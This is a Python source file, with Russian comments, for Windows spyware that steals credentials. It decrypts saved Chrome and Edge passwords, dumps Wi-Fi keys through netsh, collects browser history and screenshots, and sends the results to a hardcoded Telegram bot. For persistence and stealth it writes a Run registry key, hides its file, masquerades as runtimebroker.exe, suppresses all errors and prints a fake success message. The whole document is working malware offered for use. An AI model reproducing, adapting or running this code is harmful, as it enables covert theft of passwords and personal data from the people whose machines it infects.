import os
import sys
import sqlite3
import shutil
import tempfile
import requests
import platform
import time
import threading
from PIL import ImageGrab
import win32crypt
from browser_history import get_history
import winreg
import subprocess
from Crypto.Cipher import AES
import base64

# === КОНФИГУРАЦИЯ ===
BOT_TOKEN = "8235278058:AAEGtKZ_GWDVawWZDAXW8T04wQg1EahWxso"  # ЗАМЕНИ НА СВОЙ
CHAT_ID = "7752398574"     # ЗАМЕНИ НА СВОЙ
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# === ШИФРОВАНИЕ ДЛЯ СКРЫТНОСТИ ===
class SimpleCrypto:
    def __init__(self, key='16bytekey1234567'):
        self.key = key.encode().ljust(16, b'\0')[:16]
    
    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        return base64.b64encode(cipher.nonce + tag + ciphertext).decode()
    
    def decrypt(self, data):
        data = base64.b64decode(data.encode())
        nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
        cipher = AES.new(self.key, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode()

crypto = SimpleCrypto()

# === СИСТЕМНЫЕ ФУНКЦИИ ДЛЯ СКРЫТНОСТИ ===
def hide_file(filepath):
    """Скрытие файла в системе"""
    try:
        subprocess.run(f'attrib +s +h "{filepath}"', shell=True, capture_output=True)
    except:
        pass

def add_to_startup():
    """Добавление в автозагрузку"""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, sys.executable)
    except:
        pass

def is_admin():
    """Проверка прав администратора"""
    try:
        return os.getuid() == 0
    except AttributeError:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin()

# === ШПИОНСКИЕ ФУНКЦИИ ===
def take_screenshot():
    """Скриншот экрана"""
    try:
        screenshot = ImageGrab.grab(all_screens=True)
        temp_file = os.path.join(tempfile.gettempdir(), f"sys_temp_{int(time.time())}.png")
        screenshot.save(temp_file)
        return temp_file
    except Exception as e:
        return None

def steal_browser_data():
    """Кража данных из браузеров"""
    results = ""
    
    # Chrome
    try:
        chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        if os.path.exists(chrome_path):
            shutil.copy2(chrome_path, os.path.join(tempfile.gettempdir(), 'chrome_temp'))
            conn = sqlite3.connect(os.path.join(tempfile.gettempdir(), 'chrome_temp'))
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for url, user, pwd in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(pwd)[1].decode('utf-8')
                    results += f"[CHROME]\nURL: {url}\nUser: {user}\nPassword: {password}\n\n"
                except:
                    pass
            conn.close()
            os.remove(os.path.join(tempfile.gettempdir(), 'chrome_temp'))
    except:
        pass
    
    # Edge
    try:
        edge_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
        if os.path.exists(edge_path):
            shutil.copy2(edge_path, os.path.join(tempfile.gettempdir(), 'edge_temp'))
            conn = sqlite3.connect(os.path.join(tempfile.gettempdir(), 'edge_temp'))
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for url, user, pwd in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(pwd)[1].decode('utf-8')
                    results += f"[EDGE]\nURL: {url}\nUser: {user}\nPassword: {password}\n\n"
                except:
                    pass
            conn.close()
            os.remove(os.path.join(tempfile.gettempdir(), 'edge_temp'))
    except:
        pass
    
    return results

def steal_browser_history():
    """Кража истории браузера"""
    try:
        histories = get_history()
        history_text = "BROWSER HISTORY:\n"
        for entry in histories.histories[-100:]:  # Последние 100 записей
            history_text += f"{entry[0]} - {entry[1]}\n"
        return history_text
    except:
        return ""

def get_system_info():
    """Сбор системной информации"""
    info = f"""
=== SYSTEM INFORMATION ===
Computer: {platform.node()}
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Architecture: {platform.architecture()[0]}
Processor: {platform.processor()}
User: {os.getlogin()}
Admin: {is_admin()}
Time: {time.ctime()}
    """
    return info

def get_wifi_passwords():
    """Получение сохраненных WiFi паролей"""
    try:
        profiles = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                capture_output=True, text=True).stdout
        passwords = "WI-FI PASSWORDS:\n"
        
        for line in profiles.split('\n'):
            if 'All User Profile' in line:
                profile_name = line.split(':')[1].strip()
                try:
                    profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', 
                                                 profile_name, 'key=clear'], 
                                                capture_output=True, text=True).stdout
                    if 'Key Content' in profile_info:
                        for key_line in profile_info.split('\n'):
                            if 'Key Content' in key_line:
                                password = key_line.split(':')[1].strip()
                                passwords += f"{profile_name}: {password}\n"
                                break
                except:
                    pass
        return passwords
    except:
        return ""

# === ОТПРАВКА ДАННЫХ ===
def send_to_telegram(file_path=None, text=None):
    """Отправка данных через Telegram"""
    try:
        if text:
            # Шифрование текста перед отправкой
            encrypted_text = crypto.encrypt(text[:4000])  # Ограничение длины
            requests.post(f"{TELEGRAM_API_URL}/sendMessage",
                         json={'chat_id': CHAT_ID, 'text': encrypted_text})
        
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                files = {'document': file}
                data = {'chat_id': CHAT_ID}
                requests.post(f"{TELEGRAM_API_URL}/sendDocument", 
                             files=files, data=data, timeout=30)
            # Удаление временного файла после отправки
            try:
                os.remove(file_path)
            except:
                pass
    except Exception as e:
        pass  # Тихий режим - никаких ошибок

def collect_and_send_data():
    """Основная функция сбора и отправки данных"""
    # Системная информация
    system_info = get_system_info()
    send_to_telegram(text=system_info)
    
    # WiFi пароли
    wifi_info = get_wifi_passwords()
    if wifi_info:
        send_to_telegram(text=wifi_info)
    
    # Данные браузеров
    browser_data = steal_browser_data()
    if browser_data:
        send_to_telegram(text=browser_data)
    
    # История браузеров
    history = steal_browser_history()
    if history:
        send_to_telegram(text=history)
    
    # Скриншот
    screenshot_file = take_screenshot()
    if screenshot_file:
        send_to_telegram(file_path=screenshot_file)

# === МАСКИРОВКА ПОД СИСТЕМНЫЙ ПРОЦЕСС ===
def fake_system_process():
    """Прикрытие - имитация системного процесса"""
    process_name = os.path.basename(sys.executable).lower()
    system_names = ['svchost', 'runtimebroker', 'dllhost', 'taskhostw']
    
    if process_name not in system_names:
        # Переименование исполняемого файла
        try:
            new_path = os.path.join(os.path.dirname(sys.executable), 'runtimebroker.exe')
            if not os.path.exists(new_path):
                shutil.copy2(sys.executable, new_path)
                subprocess.Popen([new_path], shell=True)
                sys.exit(0)
        except:
            pass

# === ОСНОВНАЯ ПРОГРАММА ===
def main():
    # Маскировка под системный процесс
    fake_system_process()
    
    # Скрытие файла
    hide_file(sys.executable)
    
    # Добавление в автозагрузку
    add_to_startup()
    
    # Основной цикл работы
    counter = 0
    while True:
        try:
            # Каждые 10 минут собираем данные
            if counter % 10 == 0:
                collect_and_send_data()
            
            counter += 1
            time.sleep(60)  # Ожидание 1 минуту
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            # Абсолютно тихий режим - никаких ошибок наружу
            time.sleep(300)  # При ошибке ждем 5 минут

if __name__ == "__main__":
    # Запуск в отдельном потоке для скрытности
    if len(sys.argv) > 1 and sys.argv[1] == "--install":
        main()
    else:
        # Первый запуск - установка
        subprocess.Popen([sys.executable, sys.argv[0], "--install"], 
                        shell=True, stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        # Имитация нормального завершения
        print("System process completed successfully")
        sys.exit(0)